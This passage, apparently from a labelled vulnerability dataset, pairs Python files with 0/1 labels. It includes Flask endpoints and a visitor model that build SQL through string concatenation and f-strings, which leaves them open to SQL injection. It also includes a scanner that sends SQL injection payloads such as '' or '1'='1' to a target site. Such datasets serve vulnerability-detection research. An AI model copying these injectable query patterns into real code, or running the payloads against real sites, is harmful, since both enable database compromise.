    been canceled or fulfilled.
    """"""

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """"""
    Return the in progress order that corresponds with ClientId and ListingID
    """"""
    matched_rows = []

    order = conn.cursor()
    order.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                  "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId) + "" AND \""ListingID\"" = "" + str(listingId) +
                  "" AND t1.\""Status\"" = \'In progress\'"")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """"""
    given a clientId and listingId cancel the order in progress associated with them
    """"""
    order = conn.cursor()
    order.execute(
        ""UPDATE public.\""Order\"" SET \""Status\"" = 'Canceled' WHERE \""ClientID\"" = "" + str(clientId) +
        "" AND \""ListingID\"" = "" + str(listingId) + "" AND \""Status\"" = \'In progress\'"")
    conn.commit()

    order.close()


def order_to_json(rows):
    """"""
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """"""
    string = """"
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += "",""

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """"""
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """"""

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return ""["" + output + ""]""  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """"""
    Return a list of Order tuples belonging to the client with the given id.
    """"""
    matched_rows = []

    orders = conn.cursor()
    orders.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                   "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = ""\'Completed\'""


@app.route(""/api/markComplete/<int:clientID>/<int:listingID>"", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """""" A function that changes the status of the order with listing id listing_id to complete.
        Returns ""Success"" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """"""

    sql = \
        """"""
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """""".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception(""The status of listing id's order was not changed. ClientID or ListingID may be out of range."")
    return ""Success""


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """"""
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """"""
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """"""
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """"""
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """"""
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """"""
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host=""0.0.0.0"", port=80)
    # host=""0.0.0.0"", port=80
/n/n/n",1
22,22,1aabb095f22461455094729f5355fec554f16eaa,"payloads/sqli.py/n/nimport difflib

""""""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label ""' or '1'='1"" as ground truth
Assumption: should be the same page for sql injection, different with false page
singel quote and double quote is not fixed yet.
""""""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	# payloads = [""' and '1=2"", ""' or '1'='1"", '"" or ""1""=""1']
	payloads = [""' and '1=2"",'"" or ""1""=""1', ""' or '1'='1""]
	return payloads

# def get_false():
# 	payloads = ""' and '1=2""
# 	return payloads

def get_all():
	""""""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	""""""
	## temp test
	# payloads = [""' or '1=1""]
	payloads = [""' or '1=1"",   ""'1 'or' 1'='1"",""' or '1'='1"",  ""'or 1=1#"", ""' OR '1=1 %00"", '"" or ""1=1']
	payloads = [(item, ""SQL Injection"") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = """"
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == ""-""):
			diff_html += ""<del>%s</del>"" % ele[1:].strip()
		elif(ele[0] == ""+""):
			diff_html += ""<ins>%s</ins>"" %ele[1:].strip()

	return diff_html

if __name__ == ""__main__"":	
	print get_all()
/n/n/npayloads/test_inject.py/n/nimport requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = """"

    #if get
    if method == ""GET"":
        getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == ""POST"":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime(""%S-%f"")
    else:
        return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

    dirname = ""exploits/""
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy(""exploit.py"", dirname)

    f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
    f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == ""GET"":
                getURL = url + ""?"" + paramname+""=""+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == ""POST"":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)
        if (badhtml[0] == badhtml[1]) and (badhtml[0] !=badhtml[2]):
            ## true filter should be two
            compare_res = sqli.compare_html(badhtml[2], html)  
            match = re.findall(r'<ins>.+', compare_res)
        elif(badhtml[0]==badhtml[2] and badhtml[0] !=badhtml[1]):
            compare_res = sqli.compare_html(badhtml[1], html)  
            match = re.findall(r'<ins>.+', compare_res)
        else:
            match = """"
        # if(content.status_code==200) and badhtml[1]==html:
        #     compare_res = sqli.compare_html(badhtml[0], html)  
        #     match = re.findall(r'<ins>.+', compare_res)

        # else:
        #     match = """"
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + ""/index.php"")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if ""GNU/Linux"" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == ""__main__"":
    # get_payloads(v=True)

    payloads = sqli.get_all()
    url_list = ['/directorytraversal/directorytraversal.php',
                ""/commandinjection/commandinjection.php"",
                ""/sqli/sqli.php"",
                ""/serverside/eval2.php"",
                ""/openredirect/openredirect.php""]
    for payload in payloads:
        injectPayload(url_list[0], 'ascii', 'GET', payload)
        injectPayload(url_list[1], ""host"", 'POST', payload)
        injectPayload(url_list[2], ""username"", ""POST"", payload)
        injectPayload(url_list[3], ""page"", ""POST"", payload)
        injectPayload(url_list[4], ""redirect"", ""GET"", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = ""/commandinjection/commandinjection.php""
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, ""host"", 'POST', payload)

    #sqli
    # post in the form
    #url = ""/sqli/sqli.php""
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, ""username"", ""POST"", payload)

    #Test for server side code injection
    # url = ""/serverside/eval2.php""
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, ""page"", ""POST"", payload)
    '''
    #test for open redirect
    url = ""/openredirect/openredirect.php""
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, ""redirect"", ""GET"", payload)
    '''/n/n/n",0
23,23,1aabb095f22461455094729f5355fec554f16eaa,"/payloads/sqli.py/n/nimport difflib

""""""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label ""' or '1'='1"" as ground truth
Assumption: should be the same page for sql injection, different with false page
""""""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	payloads = [""' and '1=2"", ""' or '1'='1""]
	return payloads

# def get_false():
# 	payloads = ""' and '1=2""
# 	return payloads

def get_all():
	""""""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	""""""
	## temp test
	# payloads = [""' or '1=1""]
	payloads = [""' or '1=1"",   ""'1 'or' 1'='1"",""' or '1'='1"",  ""'or 1=1#"", ""' OR '1=1 %00""]
	payloads = [(item, ""SQL Injection"") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = """"
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == ""-""):
			diff_html += ""<del>%s</del>"" % ele[1:].strip()
		elif(ele[0] == ""+""):
			diff_html += ""<ins>%s</ins>"" %ele[1:].strip()

	return diff_html

if __name__ == ""__main__"":	
	print get_all()
/n/n/n/payloads/test_inject.py/n/nimport requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = """"

    #if get
    if method == ""GET"":
        getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == ""POST"":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime(""%S-%f"")
    else:
        return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

    dirname = ""exploits/""
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy(""exploit.py"", dirname)

    f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
    f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == ""GET"":
                getURL = url + ""?"" + paramname+""=""+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == ""POST"":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)

        if(content.status_code==200) and badhtml[1]==html:
            compare_res = sqli.compare_html(badhtml[0], html)  
            match = re.findall(r'<ins>.+', compare_res)

        else:
            match = """"
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + ""/index.php"")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if ""GNU/Linux"" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == ""__main__"":
    # get_payloads(v=True)

    payloads = sqli.get_all()
    url_list = ['/directorytraversal/directorytraversal.php',
                ""/commandinjection/commandinjection.php"",
                ""/sqli/sqli.php"",
                ""/serverside/eval2.php"",
                ""/openredirect/openredirect.php""]
    for payload in payloads:
        # injectPayload(url_list[0], 'ascii', 'GET', payload)
        # injectPayload(url_list[1], ""host"", 'POST', payload)
        injectPayload(url_list[2], ""username"", ""POST"", payload)
        injectPayload(url_list[3], ""page"", ""POST"", payload)
        injectPayload(url_list[4], ""redirect"", ""GET"", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = ""/commandinjection/commandinjection.php""
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, ""host"", 'POST', payload)

    #sqli
    # post in the form
    #url = ""/sqli/sqli.php""
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, ""username"", ""POST"", payload)

    #Test for server side code injection
    # url = ""/serverside/eval2.php""
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, ""page"", ""POST"", payload)
    '''
    #test for open redirect
    url = ""/openredirect/openredirect.php""
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, ""redirect"", ""GET"", payload)
    '''/n/n/n",1
56,56,54fc7b076fda2de74eeb55e6b75b28e09ef231c2,"experimental/python/buford/model/visitor.py/n/nfrom dataclasses import dataclass

import pytz

from config import get_connection


def get_visit_count():
    connection = get_connection()
    cursor = connection.cursor()
    cursor.execute(
        f""select count(*) from visitors;"")
    rows = cursor.fetchall()
    connection.commit()
    connection.close()
    return rows[0][0]


def get_last_n_visitors(n):
    connection = get_connection()
    cursor = connection.cursor()
    cursor.execute(
        f""select user_agent, referrer from visitors order by visit_time desc limit 3;"")
    rows = cursor.fetchall()
    connection.commit()
    connection.close()
    return rows[0][0]


@dataclass()
class Visitor:
    ip_address: str
    user_agent: str
    referrer: str
    full_path: str
    visit_time: pytz

    def on_save(self):
        connection = get_connection()
        cursor = connection.cursor()
        cursor.execute(
            ""insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values (%s, %s, %s, %s, %s);"",
            (str(self.ip_address), str(self.user_agent), str(self.referrer), str(self.full_path), self.visit_time))
        connection.commit()
        connection.close()
        return 0
/n/n/n",0
57,57,54fc7b076fda2de74eeb55e6b75b28e09ef231c2,"/experimental/python/buford/model/visitor.py/n/nfrom dataclasses import dataclass

import pytz

from config import get_connection


def get_visit_count():
    connection = get_connection()
    cursor = connection.cursor()
    cursor.execute(
        f""select count(*) from visitors;"")
    rows = cursor.fetchall()
    connection.commit()
    connection.close()
    return rows[0][0]


@dataclass()
class Visitor:
    ip_address: str
    user_agent: str
    referrer: str
    full_path: str
    visit_time: pytz

    def on_save(self):
        connection = get_connection()
        cursor = connection.cursor()
        cursor.execute(
            f""insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values ('{self.ip_address}', '{self.user_agent}', '{self.referrer}', '{self.full_path}', '{self.visit_time}');"")
        connection.commit()
        connection.close()
        return 0
/n/n/n",1
98,98,ffe6ce08e52ff12a05779b98c85ccbf72410eb33,"postgresql_setting.py/n/n#!/usr/bin/python
# -*- coding: utf-8 -*-

ANSIBLE_METADATA = {'status': ['stableinterface'],
                    'supported_by': 'community',
                    'version': '1.0'}


DOCUMENTATION = '''
---
module: postgresql_setting
short_description: manage config settings for PostgreSQL instance.
description:
  - Change server configuration parameters across the entire database cluster
  - New values will be effective after the next server configuration reload,
    or after the next server restart in the case of parameters that can only
    be changed at server start
  - Only superusers can change configuration settings
author: ""Kostiantyn Nemchenko (@kostiantyn-nemchenko)""
version_added: ""2.3""
requirements:
  - psycopg2
options:
  login_user:
    description:
      - The username used to authenticate with
    required: false
    default: null
  login_password:
    description:
      - The password used to authenticate with
    required: false
    default: null
  login_host:
    description:
      - Host running the database
    required: false
    default: localhost
  login_unix_socket:
    description:
      - Path to a Unix domain socket for local connections
    required: false
    default: null
  port:
    description:
      - Database port to connect to.
    required: false
    default: 5432
  option:
    description:
      - The parameter from PostgreSQL configuration file
    required: true
    default: null
  value:
    description:
      - The value of the parameter to change
    required: false
    default: null
  state:
    description:
      - The parameter state
    required: false
    default: present
    choices: [ ""present"", ""absent"" ]
'''


EXAMPLES = '''
# Set work_mem parameter to 8MB
- postgresql_setting:
    guc: work_mem
    value: 8MB
    state: present

# Allow only local TCP/IP ""loopback"" connections to be made
- postgresql_setting:
    guc: listen_addresses
    state: absent

# Enable autovacuum
- postgresql_setting:
    guc: autovacuum
    value: on
'''
import traceback

try:
    import psycopg2
    import psycopg2.extras
    from psycopg2 import sql
except ImportError:
    postgresqldb_found = False
else:
    postgresqldb_found = True

# import module snippets
from ansible.module_utils.six import iteritems
from ansible.module_utils.basic import AnsibleModule
from ansible.module_utils.database import SQLParseError
from ansible.module_utils._text import to_native


class NotSupportedError(Exception):
    pass


# ===========================================
# PostgreSQL module specific support methods.
#

def is_guc_configurable(cursor, guc):
    """"""Check if guc is a preset parameter
    https://www.postgresql.org/docs/current/static/runtime-config-preset.html
    """"""
    cursor.execute(""""""
        SELECT EXISTS
            (SELECT 1
             FROM pg_settings
             WHERE context <> 'internal'
             AND name = %s);
        """""",
        (guc,)
    )
    return cursor.fetchone()[0]


def get_default_guc_value(cursor, guc):
    """"""Get parameter value assumed at server startup""""""
    cursor.execute(""""""
        SELECT boot_val
        FROM pg_settings
        WHERE name = %s;
        """""",
        (guc,)
    )
    return cursor.fetchone()[0]


def is_guc_default(cursor, guc):
    """"""Whether the parameter has not been changed since the last database start or
    configuration reload""""""
    cursor.execute(""""""
        SELECT EXISTS
            (SELECT 1
             FROM pg_settings
             WHERE boot_val = reset_val
             AND name = %s);
        """""",
        (guc,)
    )
    return cursor.fetchone()[0]


def guc_exists(cursor, guc):
    """"""Check if such parameter exists""""""
    cursor.execute(""""""
        SELECT name
        FROM pg_settings
        WHERE name = %s;
        """""",
        (guc,)
    )
    return cursor.rowcount > 0


def do_guc_reset(cursor, guc):
    """"""Reset parameter if it has non-default value""""""
    if not is_guc_default(cursor, guc):
        cursor.execute(
            sql.SQL(""ALTER SYSTEM RESET {}"").format(sql.Identifier(guc)))
        return True
    else:
        return False


def do_guc_set(cursor, guc, value):
    """"""Set new value for parameter""""""
    if not guc_matches(cursor, guc, value):
        cursor.execute(
            sql.SQL(""ALTER SYSTEM SET {} TO %s"").format(sql.Identifier(guc)),  
            (value,))
        return True
    else:
        return False


def guc_matches(cursor, guc, value):
    """"""Check if setting matches the specified value""""""
    cursor.execute(""SELECT current_setting(%s) = %s"", (guc, value))
    return cursor.fetchone()[0]

# ===========================================
# Module execution.
#


def main():
    module = AnsibleModule(
        argument_spec=dict(
            login_user=dict(default=""postgres""),
            login_password=dict(default="""", no_log=True),
            login_host=dict(default=""""),
            login_unix_socket=dict(default=""""),
            port=dict(default=""5432""),
            guc=dict(required=True,
                     aliases=[""name"", ""setting"", ""option"", ""parameter""]),
            value=dict(default=""""),
            state=dict(default=""present"", choices=[""absent"", ""present""]),
        ),
        supports_check_mode=True
    )

    if not postgresqldb_found:
        module.fail_json(msg=""the python psycopg2 module is required"")

    guc = module.params[""guc""]
    value = module.params[""value""]
    port = module.params[""port""]
    state = module.params[""state""]
    changed = False

    # To use defaults values, keyword arguments must be absent, so
    # check which values are empty and don't include in the **kw
    # dictionary
    params_map = {
        ""login_host"": ""host"",
        ""login_user"": ""user"",
        ""login_password"": ""password"",
        ""port"": ""port""
    }
    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)
              if k in params_map and v != '')

    # If a login_unix_socket is specified, incorporate it here.
    is_localhost = ""host"" not in kw or kw[""host""] == """" or kw[""host""] == ""localhost""
    
    if is_localhost and module.params[""login_unix_socket""] != """":
        kw[""host""] = module.params[""login_unix_socket""]

    try:
        db_connection = psycopg2.connect(database=""postgres"", **kw)
        # Enable autocommit
        if psycopg2.__version__ >= '2.4.2':
            db_connection.autocommit = True
        else:
            db_connection.set_isolation_level(psycopg2
                                              .extensions
                                              .ISOLATION_LEVEL_AUTOCOMMIT)
        cursor = db_connection.cursor(
                    cursor_factory=psycopg2.extras.DictCursor)
    except Exception as e:
        module.fail_json(msg=""unable to connect to database: %s"" % to_native(e), 
                         exception=traceback.format_exc())

    try:
        if is_guc_configurable(cursor, guc):
            if module.check_mode:
                if state == ""absent"":
                    changed = not is_guc_default(cursor, guc)
                elif state == ""present"":
                    changed = not guc_matches(cursor, guc, value)
                module.exit_json(changed=changed, guc=guc)

            if state == ""absent"":
                try:
                    changed = do_guc_reset(cursor, guc)
                except SQLParseError as e:
                    e = get_exception()
                    module.fail_json(msg=to_native(e), exception=traceback.format_exc())

            elif state == ""present"":
                try:
                    changed = do_guc_set(cursor, guc, value)
                except SQLParseError as e:
                    e = get_exception()
                    module.fail_json(msg=to_native(e), exception=traceback.format_exc())
        else:
            module.warn(""Guc %s does not exist or is preset"" % guc)
    except NotSupportedError as e:
        module.fail_json(msg=to_native(e), exception=traceback.format_exc())
    except SystemExit:
        # Avoid catching this on Python 2.4
        raise
    except Exception as e:
        module.fail_json(msg=""Database query failed: %s"" % to_native(e), exception=traceback.format_exc())

    module.exit_json(changed=changed, guc=guc)


if __name__ == '__main__':
    main()

/n/n/n",0
99,99,ffe6ce08e52ff12a05779b98c85ccbf72410eb33,"/postgresql_setting.py/n/n#!/usr/bin/python
# -*- coding: utf-8 -*-

